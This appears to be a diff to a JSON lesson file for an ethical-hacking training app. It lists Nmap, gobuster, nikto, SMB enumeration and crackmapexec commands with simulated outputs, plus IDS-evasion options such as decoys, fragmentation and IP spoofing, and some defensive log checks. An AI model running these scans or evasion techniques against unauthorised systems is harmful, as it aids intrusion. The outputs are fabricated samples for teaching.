+          { "command": "nano file.txt", "description": "Simple, modeless text editor. Use Ctrl+O to save, Ctrl+X to exit.", "simulation": "  GNU nano 6.2                        file.txt\n\nThis is a text file edited in nano.\n\n^G Help      ^O Write Out ^W Where Is  ^K Cut\n^X Exit      ^R Read File ^\\ Replace   ^U Paste" },
+          { "command": "vim file.txt", "description": "Advanced modal editor. Press 'i' to insert, Esc then ':wq' to save and quit.", "simulation": "~\n~\n~\n-- INSERT --" },
+          { "command": "Vim Cheatsheet", "description": "dd=delete line, yy=copy line, p=paste, /search=find text, :set number=show line numbers.", "isReadOnly": true }
+        ]
+      },
+      {
+        "name": "12 Exploration: Service Discovery",
+        "description": "Service discovery is the process of finding what's running on a target. Open ports reveal services, and service versions reveal vulnerabilities. This is the bridge between reconnaissance and exploitation.",
+        "commands": [
+          { "command": "nmap -sV 10.10.10.5", "description": "Service Version Detection: Probes open ports to determine the exact software and version running. This is crucial because exploits target specific versions (e.g., Apache 2.4.49 has path traversal CVE-2021-41773).", "simulation": "Starting Nmap 7.94 ( https://nmap.org )\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3\n80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))\n443/tcp  open  ssl     OpenSSL 1.1.1\n3306/tcp open  mysql   MySQL 8.0.30\nService detection performed. 4 services scanned." },
+          { "command": "nmap -sC -sV -oN scan.txt 10.10.10.5", "description": "The 'go-to' scan: -sC runs default NSE scripts (checks for vulns, default creds, info leaks), -sV detects versions, -oN saves readable output. Always save your scans!", "simulation": "PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1\n| ssh-hostkey:\n|   256 a8:cc:4b:2e:3f... (ECDSA)\n|   256 b2:ef:12:ab:cd... (ED25519)\n80/tcp open  http    Apache httpd 2.4.52\n|_http-title: Welcome to LIGERverse\n| http-methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.52 (Ubuntu)" },
+          { "command": "nmap -p- --min-rate 5000 10.10.10.5", "description": "Full port scan: Scans ALL 65535 TCP ports. --min-rate 5000 sends at least 5000 packets/sec for speed. Run this first to find all open ports, then do targeted -sV scan on discovered ports.", "simulation": "PORT      STATE SERVICE\n22/tcp    open  ssh\n80/tcp    open  http\n8080/tcp  open  http-proxy\n9090/tcp  open  zeus-admin\n65535 ports scanned in 12.34 seconds" },
+          { "command": "nmap -sU --top-ports 50 10.10.10.5", "description": "UDP scan: Often overlooked but critical. Services like DNS (53), SNMP (161), TFTP (69) only run on UDP. UDP scans are slower because there's no handshake to confirm open ports.", "simulation": "PORT    STATE         SERVICE\n53/udp  open          domain\n67/udp  open|filtered dhcps\n69/udp  open|filtered tftp\n161/udp open          snmp\n500/udp open|filtered isakmp" },
+          { "command": "nmap -sn 10.10.10.0/24", "description": "Host Discovery (Ping Sweep): Find all live hosts on a subnet without port scanning. Uses ICMP echo, TCP SYN to 443, TCP ACK to 80, and ICMP timestamp.", "simulation": "Nmap scan report for 10.10.10.1\nHost is up (0.001s latency).\nNmap scan report for 10.10.10.5\nHost is up (0.003s latency).\nNmap scan report for 10.10.10.10\nHost is up (0.002s latency).\n3 hosts up scanned in 2.01 seconds" },
+          { "command": "nmap --script vuln 10.10.10.5", "description": "Vulnerability scanning: Runs all NSE scripts in the 'vuln' category. Checks for known CVEs, misconfigurations, and common weaknesses.", "simulation": "PORT   STATE SERVICE\n80/tcp open  http\n| http-vuln-cve2017-5638:\n|   VULNERABLE:\n|   Apache Struts Remote Code Execution\n|     State: VULNERABLE\n|     Risk factor: High\n|     References: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638" }
+        ]
+      },
+      {
+        "name": "13 Exploration: Web & Directory",
+        "description": "Web servers often expose hidden directories, backup files, admin panels, and configuration files. Directory brute-forcing and web fingerprinting are essential first steps in web application testing.",
+        "commands": [
+          { "command": "gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt", "description": "Directory Brute-forcing: Tries thousands of common directory/file names against the web server. Use -x php,txt,bak to also check for specific extensions. Alternatives: feroxbuster (recursive), dirsearch (Python).", "simulation": "===============================================================\nGobuster v3.6\n===============================================================\n/admin                (Status: 301) [Size: 314]\n/backup               (Status: 200) [Size: 1024]\n/config               (Status: 403) [Size: 279]\n/uploads              (Status: 301) [Size: 316]\n/robots.txt           (Status: 200) [Size: 84]\n/.htaccess            (Status: 403) [Size: 279]" },
+          { "command": "nikto -h http://10.10.10.5", "description": "Web Vulnerability Scanner: Checks for 6700+ dangerous files/CGIs, outdated server versions, and misconfigurations. Noisy (easily detected by WAFs) but comprehensive. Use -Tuning to focus on specific test categories.", "simulation": "- Nikto v2.5.0\n+ Target IP:          10.10.10.5\n+ Target Hostname:    10.10.10.5\n+ Target Port:        80\n+ Server: Apache/2.4.52 (Ubuntu)\n+ /: The anti-clickjacking X-Frame-Options header is not present.\n+ /: The X-Content-Type-Options header is not set.\n+ /admin/: Directory indexing found.\n+ /config.php: PHP Config file found.\n+ OSVDB-3268: /backup/: Directory indexing found.\n+ 7 item(s) reported on remote host" },
+          { "command": "curl -I http://10.10.10.5", "description": "Fetch HTTP response headers only (-I = HEAD request). Reveals server software, language, framework, cookies, and security headers. Quick and stealthy fingerprinting.", "simulation": "HTTP/1.1 200 OK\nServer: Apache/2.4.52 (Ubuntu)\nX-Powered-By: PHP/8.1.2\nSet-Cookie: PHPSESSID=abc123; path=/\nContent-Type: text/html; charset=UTF-8" },
+          { "command": "whatweb http://10.10.10.5", "description": "Technology Fingerprinting: Identifies CMS (WordPress, Joomla), frameworks (Laravel, Django), programming languages, JavaScript libraries, and server details from HTTP responses.", "simulation": "http://10.10.10.5 [200 OK] Apache[2.4.52], Country[RESERVED], HTML5, HTTPServer[Ubuntu Linux], JQuery[3.6.0], PHP[8.1.2], Script, Title[LIGERverse], WordPress[6.2], X-Powered-By[PHP/8.1.2]" },
+          { "command": "curl http://10.10.10.5/robots.txt", "description": "Check robots.txt for directories the site doesn't want search engines to index. Often reveals admin panels, sensitive paths, and hidden content.", "simulation": "User-agent: *\nDisallow: /admin/\nDisallow: /backup/\nDisallow: /config/\nDisallow: /api/v1/internal/" }
+        ]
+      },
+      {
+        "name": "14 Exploration: SMB & Enumeration",
+        "description": "SMB (Server Message Block) is Windows file sharing protocol on ports 139/445. Misconfigured SMB shares are one of the most common entry points in corporate networks. Null sessions can leak users, shares, and OS info.",
+        "commands": [
+          { "command": "enum4linux -a 10.10.10.5", "description": "The Swiss Army knife for SMB enumeration. -a runs ALL checks: users, shares, groups, password policy, OS info. Uses null sessions (no credentials). Essential tool for Windows/Samba targets.", "simulation": "===( Target Information )===\nTarget: 10.10.10.5\nOS: Windows 10 Build 19041\n===( Share Enumeration )===\n//10.10.10.5/IPC$    Mapping: OK, Listing: DENIED\n//10.10.10.5/ADMIN$  Mapping: DENIED\n//10.10.10.5/backup  Mapping: OK, Listing: OK\n===( Users via RID Cycling )===\nuser:[administrator] rid:[0x1f4]\nuser:[guest] rid:[0x1f5]\nuser:[svc_backup] rid:[0x451]" },
+          { "command": "smbclient -L //10.10.10.5 -N", "description": "List available SMB shares. -N means null session (no password). If a share is accessible, connect with: 'smbclient //10.10.10.5/backup -N' then use 'get', 'put', 'ls' commands.", "simulation": "Sharename       Type      Comment\n---------       ----      -------\nbackup          Disk      Backup Files\nIPC$            IPC       IPC Service (Samba 4.15)\nprint$          Disk      Printer Drivers\nwwwroot         Disk      Web Server Files" },
+          { "command": "smbmap -H 10.10.10.5", "description": "Enumerate SMB share permissions quickly. Shows READ, WRITE, or NO ACCESS for each share. Use -u user -p pass for authenticated enumeration. Use -R to list files recursively.", "simulation": "[+] IP: 10.10.10.5:445\tName: target\tStatus: Authenticated\n  Disk        Permissions     Comment\n  ----        -----------     -------\n  backup      READ ONLY       Backup Files\n  wwwroot     READ, WRITE     Web Server Files\n  ADMIN$      NO ACCESS       Remote Admin\n  C$          NO ACCESS       Default share" },
+          { "command": "crackmapexec smb 10.10.10.0/24", "description": "Network-wide SMB enumeration. Discovers all SMB hosts on a subnet, shows OS version, hostname, domain, and signing status. Supports credential spraying.", "simulation": "SMB  10.10.10.5   445  DC01    [*] Windows 10.0 Build 19041 x64 (name:DC01) (domain:corp.local) (signing:True)\nSMB  10.10.10.10  445  WEB01   [*] Windows 10.0 Build 17763 x64 (name:WEB01) (domain:corp.local) (signing:False)" }
+        ]
+      },
+      {
+        "name": "15 Detection & Defense",
+        "description": "A good ethical hacker understands both sides. Knowing how defenders monitor, log, and detect attacks helps you stay stealthy and write better reports. This section covers blue team fundamentals.",
+        "commands": [
+          { "command": "cat /var/log/auth.log | grep 'Failed'", "description": "Check for failed SSH login attempts. Multiple failures from one IP = brute-force attack. This is the first log defenders check during incident response.", "simulation": "May  4 20:15:01 ligerverse sshd[1234]: Failed password for root from 192.168.1.100 port 54321 ssh2\nMay  4 20:15:03 ligerverse sshd[1235]: Failed password for root from 192.168.1.100 port 54322 ssh2\nMay  4 20:15:05 ligerverse sshd[1236]: Failed password for admin from 192.168.1.100 port 54323 ssh2\nMay  4 20:15:07 ligerverse sshd[1237]: Failed password for invalid user test from 192.168.1.100" },
+          { "command": "journalctl -u ssh --since '1 hour ago'", "description": "Query systemd journal for SSH service logs from the last hour. More powerful than reading log files directly. Supports time ranges and filtering.", "simulation": "May 04 20:10:01 ligerverse sshd[1230]: Accepted publickey for minal from 10.35.62.100\nMay 04 20:15:01 ligerverse sshd[1234]: Failed password for root from 192.168.1.100" },
+          { "command": "last -a", "description": "Show recent login history with source hostnames/IPs. Reveals who logged in, when, from where, and for how long. Look for unusual times or unknown IPs.", "simulation": "minal    pts/0    Mon May  4 20:10   still logged in    10.35.62.100\nroot     tty1     Mon May  4 08:00 - 09:30  (01:30)     :0\nreboot   system   Mon May  4 07:59          still running" },
+          { "command": "ss -tunap | grep ESTABLISHED", "description": "Show all active (established) network connections with the process that owns them. Look for unexpected outbound connections (C2 beacons) or connections to unusual ports.", "simulation": "tcp  ESTAB  0  0  10.35.62.230:22    192.168.1.100:54321  users:((\"sshd\",pid=1234,fd=3))\ntcp  ESTAB  0  0  10.35.62.230:80    192.168.1.50:43210   users:((\"apache2\",pid=5678,fd=4))\ntcp  ESTAB  0  0  10.35.62.230:43210 185.45.67.89:443     users:((\"curl\",pid=9999,fd=5))" },
+          { "command": "iptables -L -n -v", "description": "List all firewall rules with packet/byte counters. Useful for understanding what traffic is allowed/blocked. Rules with zero counters may indicate unused or new rules.", "simulation": "Chain INPUT (policy DROP)\n pkts bytes target     prot opt in  out  source     destination\n  150  9000 ACCEPT     tcp  --  *   *    0.0.0.0/0  0.0.0.0/0  tcp dpt:22\n  320 19200 ACCEPT     tcp  --  *   *    0.0.0.0/0  0.0.0.0/0  tcp dpt:80\n    5   300 ACCEPT     tcp  --  *   *    0.0.0.0/0  0.0.0.0/0  tcp dpt:443\n    0     0 DROP       all  --  *   *    0.0.0.0/0  0.0.0.0/0" },
+          { "command": "IDS/IPS Concepts", "description": "IDS (Intrusion Detection System) monitors and alerts. IPS (Intrusion Prevention System) monitors and blocks. Snort and Suricata use signature-based rules to detect malicious traffic patterns. OSSEC provides host-based intrusion detection (file integrity, log analysis, rootkit detection).", "isReadOnly": true },
+          { "command": "fail2ban-client status sshd", "description": "Fail2ban automatically bans IPs after repeated failed login attempts. It monitors log files and adds iptables rules to block offenders. Essential defense against brute-force attacks.", "simulation": "Status for the jail: sshd\n|- Filter\n|  |- Currently failed: 3\n|  |- Total failed:     47\n|  `- File list:        /var/log/auth.log\n`- Actions\n   |- Currently banned: 2\n   |- Total banned:     12\n   `- Banned IP list:   192.168.1.100 10.0.0.55" }
+        ]
+      }
+    ],
+    "attackChain": [
+      { "step": "Shell", "desc": "Translate commands" },
+      { "step": "Navigation", "desc": "Explore filesystem" },
+      { "step": "File", "desc": "Manipulate data" },
+      { "step": "Permissions", "desc": "Analyze access" },
+      { "step": "Network", "desc": "Map connections" },
+      { "step": "Exploration", "desc": "Discover services" },
+      { "step": "Detection", "desc": "Monitor & defend" },
+      { "step": "Windows", "desc": "Understand OS" }
+    ],
+    "challenges": [],
+    "resources": [
+      { "title": "Linux Journey", "url": "https://linuxjourney.com/" },
+      { "title": "Windows Internals", "url": "https://learn.microsoft.com/en-us/sysinternals/resources/windows-internals" },
+      { "title": "GTFOBins", "url": "https://gtfobins.github.io/" },
+      { "title": "Nmap Cheat Sheet", "url": "https://www.stationx.net/nmap-cheat-sheet/" }
+    ]
+  },
+  {
     "id": "system-hacking",
     "title": "System Hacking",
     "difficulty": "Intermediate",
@@ -7,8 +440,19 @@
     "concept": "System hacking is a multi-stage process starting with discovery and enumeration. Nmap is the industry standard for identifying open ports and service versions. For stealthier local network discovery, Netdiscover passively listens for ARP requests to find live hosts. Successful system hacking relies on meticulous scanning to identify weak services like outdated Apache servers, misconfigured SMB shares, or exposed RPC ports.",
     "tools": [
       {
-        "name": "Nmap: Quick Start & Discovery",
-        "description": "Essential Nmap commands for target specification, host discovery, and quick network scanning.",
+        "name": "01 Recon: Passive Discovery",
+        "description": "Passive discovery via Netdiscover and OSINT to find live hosts without direct interaction.",
+        "commands": [
+          {
+            "command": "netdiscover -r 10.10.0.0/24",
+            "description": "Scan specific subnet range",
+            "simulation": " Currently scanning: Finished!   |   Screen View: Unique Hosts           \n                                                                         \n 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240         \n _____________________________________________________________________________\n   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      \n -----------------------------------------------------------------------------\n 10.10.0.1       00:50:56:c0:00:08      1      60  VMware, Inc.              \n 10.10.0.10      00:15:5d:01:22:33      1      60  Microsoft Corporation     \n 10.10.0.25      08:00:27:12:34:56      1      60  PCS Systemtechnik GmbH    \n 10.10.0.254     00:50:56:e3:11:22      1      60  VMware, Inc.              "
+          }
+        ]
+      },
+      {
+        "name": "02 Scan: Active Enumeration",
+        "description": "Active enumeration using Nmap scripts and timing templates to identify open ports and services.",
         "commands": [
           {
             "command": "nmap -sn 192.168.1.0/24",
@@ -21,56 +465,9 @@
             "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.10\nHost is up (0.01s latency).\nNot shown: 97 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n443/tcp open https\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds"
           },
           {
-            "command": "nmap -sV -sC 192.168.1.10",
-            "description": "Run service detection and default NSE scripts",
-            "usage": "Identify open ports and run standard enumeration scripts.",
-            "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.10\nHost is up (0.02s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 9c:1b:2c:d1:3f... (RSA)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-title: Welcome to Admin Portal\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nNmap done: 1 IP address (1 host up) scanned in 6.42 seconds"
-          },
-          {
-            "command": "nmap -iL targets.txt",
-            "description": "Scan a list of targets from a file",
-            "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for server1.local (192.168.1.10)\nHost is up (0.01s latency).\n...\nNmap scan report for server2.local (192.168.1.11)\nHost is up (0.02s latency).\n...\nNmap done: 2 IP addresses (2 hosts up) scanned in 15.2 seconds"
-          },
-          {
-            "command": "nmap 192.168.1.1-254",
-            "description": "Scan a specific range of IP addresses",
-            "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.1\nHost is up (0.001s latency).\n...\nNmap scan report for 192.168.1.100\nHost is up (0.05s latency).\n...\nNmap done: 254 IP addresses (15 hosts up) scanned in 45.1 seconds"
-          },
-          {
-            "command": "nmap --exclude 192.168.1.1",
-            "description": "Exclude specific hosts from the scan",
-            "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.2\n...\nNmap done: 253 IP addresses scanned in 40.5 seconds"
-          },
-          {
-            "command": "nmap -sL 192.168.1.1-3",
-            "description": "List targets only (No Scan)",
-            "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.1\nNmap scan report for 192.168.1.2\nNmap scan report for 192.168.1.3\nNmap done: 3 IP addresses (0 hosts up) scanned in 0.01 seconds"
-          },
-          {
-            "command": "nmap -Pn 192.168.1.1-5",
-            "description": "Disable host discovery (treat hosts as online, port scan only)",
-            "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.1\nHost is up.\nNmap scan report for 192.168.1.2\nHost is up.\n...\nNmap done: 5 IP addresses (5 hosts up) scanned in 10.2 seconds"
-          },
-          {
-            "command": "nmap -PR 192.168.1.0/24",
-            "description": "ARP discovery on local network",
-            "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.1\nHost is up (0.0010s latency).\nMAC Address: 00:50:56:C0:00:08 (VMware)\nNmap scan report for 192.168.1.15\nHost is up (0.0020s latency).\nMAC Address: 08:00:27:12:34:56 (Oracle VirtualBox)\nNmap done: 256 IP addresses (2 hosts up) scanned in 2.1 seconds"
-          }
-        ]
-      },
-      {
-        "name": "Nmap: Port & Scan Techniques",
-        "description": "Techniques for TCP/UDP port scanning and OS/Service enumeration.",
-        "commands": [
-          {
             "command": "nmap -sS 192.168.1.1",
             "description": "TCP SYN stealth port scan (Default)",
             "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.1\nHost is up (0.01s latency).\nNot shown: 999 filtered tcp ports (no-response)\nPORT   STATE SERVICE\n22/tcp open  ssh\n\nNmap done: 1 IP address (1 host up) scanned in 4.5 seconds"
-          },
-          {
-            "command": "nmap -sT 192.168.1.1",
-            "description": "TCP Connect full port scan (Default without root)",
-            "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.1\nHost is up (0.01s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 2.1 seconds"
           },
           {
             "command": "nmap -sU 192.168.1.1",
@@ -78,24 +475,9 @@
             "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.1\nHost is up (0.01s latency).\nNot shown: 997 closed udp ports (port-unreach)\nPORT     STATE         SERVICE\n53/udp   open          domain\n68/udp   open|filtered dhcpc\n123/udp  open          ntp\n\nNmap done: 1 IP address (1 host up) scanned in 105.2 seconds"
           },
           {
-            "command": "nmap -p 21-100 192.168.1.1",
-            "description": "Scan a specific port range",
-            "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.1\nHost is up (0.01s latency).\nNot shown: 77 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n21/tcp open  ftp\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 0.5 seconds"
-          },
-          {
             "command": "nmap -p- 192.168.1.1",
             "description": "Scan all 65535 ports",
             "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.1\nHost is up (0.01s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT      STATE SERVICE\n22/tcp    open  ssh\n8080/tcp  open  http-proxy\n\nNmap done: 1 IP address (1 host up) scanned in 24.5 seconds"
-          },
-          {
-            "command": "nmap --top-ports 2000 192.168.1.1",
-            "description": "Scan the top x ports",
-            "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.1\nHost is up (0.01s latency).\nNot shown: 1998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 1.5 seconds"
-          },
-          {
-            "command": "nmap -sV --version-intensity 8 192.168.1.1",
-            "description": "High-intensity service version detection",
-            "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.1\nHost is up (0.01s latency).\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nNmap done: 1 IP address (1 host up) scanned in 15.2 seconds"
           },
           {
             "command": "nmap -O --osscan-guess 192.168.1.1",
@@ -106,68 +488,11 @@
             "command": "nmap -A 192.168.1.1",
             "description": "Enable OS/version detection, script scanning, and traceroute",
             "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.1\nHost is up (0.01s latency).\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 9c:1b... (RSA)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-title: Welcome to Admin Portal\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS details: Linux 4.15 - 5.6\nTRACEROUTE\nHOP RTT     ADDRESS\n1   1.00 ms 192.168.1.1\n\nNmap done: 1 IP address (1 host up) scanned in 12.5 seconds"
-          }
-        ]
-      },
-      {
-        "name": "Nmap: NSE Scripts & Output",
-        "description": "Leverage Nmap Scripting Engine (NSE) and save scan results in various formats.",
-        "commands": [
-          {
-            "command": "nmap --script default 192.168.1.1",
-            "description": "Scan using safe and default NSE scripts",
-            "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.1\nHost is up (0.01s latency).\nPORT   STATE SERVICE\n80/tcp open  http\n|_http-title: Welcome to Admin Portal\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n\nNmap done: 1 IP address (1 host up) scanned in 2.5 seconds"
           },
-          {
-            "command": "nmap --script vuln 192.168.1.1",
-            "description": "Scan for vulnerabilities using NSE",
-            "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.1\nHost is up (0.01s latency).\nPORT   STATE SERVICE\n80/tcp open  http\n| http-enum: \n|   /admin/: Possible admin folder\n|   /login.php: Possible admin login page\n|   /robots.txt: Robots.txt found\n| http-csrf:\n|   Found the following possible CSRF vulnerabilities: \n|     Path: http://192.168.1.1/login.php\n|     Form id: loginForm\n\nNmap done: 1 IP address (1 host up) scanned in 15.5 seconds"
-          },
-          {
-            "command": "nmap --script=http,banner 192.168.1.1",
-            "description": "Scan with specific script categories",
-            "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.1\nHost is up (0.01s latency).\nPORT   STATE SERVICE\n22/tcp open  ssh\n|_banner: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5\n80/tcp open  http\n|_http-title: Welcome to Admin Portal\n\nNmap done: 1 IP address (1 host up) scanned in 2.5 seconds"
-          },
-          {
-            "command": "nmap --script ssl-enum-ciphers -p 443 192.168.1.1",
-            "description": "SSL/TLS Enumeration",
-            "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.1\nHost is up (0.01s latency).\nPORT    STATE SERVICE\n443/tcp open  https\n| ssl-enum-ciphers: \n|   TLSv1.2: \n|     ciphers: \n|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A\n|       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (secp256r1) - A\n|     compressors: \n|       NULL\n|     cipher preference: server\n|_  least strength: A\n\nNmap done: 1 IP address (1 host up) scanned in 3.5 seconds"
-          },
-          {
-            "command": "nmap -oN normal.txt 192.168.1.1",
-            "description": "Save normal output to a file",
-            "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.1\nHost is up (0.01s latency).\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 1.5 seconds\n\n[System Info]\nFile 'normal.txt' created successfully."
-          },
-          {
-            "command": "nmap -oX output.xml 192.168.1.1",
-            "description": "Save output in XML format for parsing",
-            "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.1\nHost is up (0.01s latency).\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 1.5 seconds\n\n[System Info]\nFile 'output.xml' created successfully."
-          },
-          {
-            "command": "nmap -oG grep.file 192.168.1.1",
-            "description": "Save in grepable format",
-            "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.1\nHost is up (0.01s latency).\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 1.5 seconds\n\n[System Info]\nFile 'grep.file' created successfully."
-          },
-          {
-            "command": "nmap -oA results 192.168.1.1",
-            "description": "Save in all three major formats at once",
-            "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.1\nHost is up (0.01s latency).\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 1.5 seconds\n\n[System Info]\nFiles 'results.nmap', 'results.xml', and 'results.gnmap' created successfully."
-          }
-        ]
-      },
-      {
-        "name": "Nmap: Timing & Evasion",
-        "description": "Adjust timing templates and evade basic firewalls/IDS for red team ops.",
-        "commands": [
           {
             "command": "nmap -T4 192.168.1.1",
             "description": "Aggressive timing (T4) for faster scans",
             "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nWarning: 192.168.1.1 giving up on port because retransmission cap hit (6).\nNmap scan report for 192.168.1.1\nHost is up (0.01s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 0.8 seconds"
-          },
-          {
-            "command": "nmap -T2 192.168.1.1",
-            "description": "Polite timing (T2) to slow down and evade IDS",
-            "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.1\nHost is up (0.01s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 45.5 seconds"
           },
           {
             "command": "nmap -f 192.168.1.1",
@@ -178,97 +503,69 @@
             "command": "nmap -D decoy1,decoy2 192.168.1.1",
             "description": "Send scans from spoofed decoy IPs",
             "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.1\nHost is up (0.01s latency).\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 2.5 seconds\n[System Info] Packets sent with source IPs of decoy1 and decoy2 to evade IDS."
-          },
-          {
-            "command": "nmap --data-length 200 192.168.1.1",
-            "description": "Append random data to bypass simple packet filters",
-            "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.1\nHost is up (0.01s latency).\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 2.8 seconds\n[System Info] 200 bytes of random data appended to all packets sent."
-          },
-          {
-            "command": "nmap -S spoofed-ip 192.168.1.1",
-            "description": "Spoof source IP address",
-            "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nWARNING: You must use -e to specify the interface if you want to spoof your IP.\nNmap scan report for 192.168.1.1\nHost is up (0.01s latency).\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 2.5 seconds"
-          },
-          {
-            "command": "nmap -g 53 192.168.1.1",
-            "description": "Use a specific source port (e.g. 53 DNS) to bypass rules",
-            "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.1\nHost is up (0.01s latency).\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 2.5 seconds\n[System Info] All scans sent with source port 53 (DNS) to bypass packet filters."
           }
         ]
       },
       {
-        "name": "Netdiscover",
-        "description": "Passive ARP reconnaissance tool for local network discovery.",
+        "name": "03 Enum: Service & Vulnerability ID",
+        "description": "Identify SMB shares, RPC vulnerabilities, and CMS configurations using specialized tools and NSE scripts.",
         "commands": [
           {
-            "command": "netdiscover -r 10.10.0.0/24",
-            "description": "Scan specific subnet range",
-            "simulation": " Currently scanning: Finished!   |   Screen View: Unique Hosts           \n                                                                         \n 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240         \n _____________________________________________________________________________\n   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      \n -----------------------------------------------------------------------------\n 10.10.0.1       00:50:56:c0:00:08      1      60  VMware, Inc.              \n 10.10.0.10      00:15:5d:01:22:33      1      60  Microsoft Corporation     \n 10.10.0.25      08:00:27:12:34:56      1      60  PCS Systemtechnik GmbH    \n 10.10.0.254     00:50:56:e3:11:22      1      60  VMware, Inc.              "
-          }
-        ]
-      },
-      {
-        "name": "SMB & RPC Enumeration",
-        "description": "Tools for investigating Windows-specific services.",
-        "commands": [
+            "command": "nmap --script vuln 192.168.1.1",
+            "description": "Scan for vulnerabilities using NSE",
